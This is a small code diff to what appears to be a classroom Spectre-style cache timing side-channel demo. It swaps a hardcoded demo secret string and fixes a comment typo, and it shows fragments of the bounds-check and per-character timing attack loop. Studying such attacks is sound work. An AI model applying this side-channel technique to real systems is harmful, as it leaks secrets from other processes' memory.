@@ -27,7 +27,7 @@ unsigned int arr1_size = 16;    //Here I have made only the first 16 elements of
 uint8_t arr1[160] = {16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186};  //Random values for the accessible function
 uint8_t arr2[256 * 512];    //Here array2 values are accessed via the arr1 values throught the function... can be thought as property  fetched for every user in db
 
-string secret = "Sachin@jafka#563";  /* RETRIEVING THIS SECRET KEY IS THE GOAL OF THE ATTACKER */
+string secret = "Sachin@ES215*123";  /* RETRIEVING THIS SECRET KEY IS THE GOAL OF THE ATTACKER */
 
 int fetch_function(size_t idx)
 {
@@ -122,7 +122,7 @@ void readMemoryByte(size_t target_idx)
             fetch_function(idx);
         }
 
-        /* Here I have set a timing attack for earch character*/
+        /* Here I have set a timing attack for each character*/
         for (i = 0; i < 256; i++)
         {
             curr_char = ATTACK_PATTERN[i];  // ATTACK_PATTERN decides which character I will be setting the timing attack for
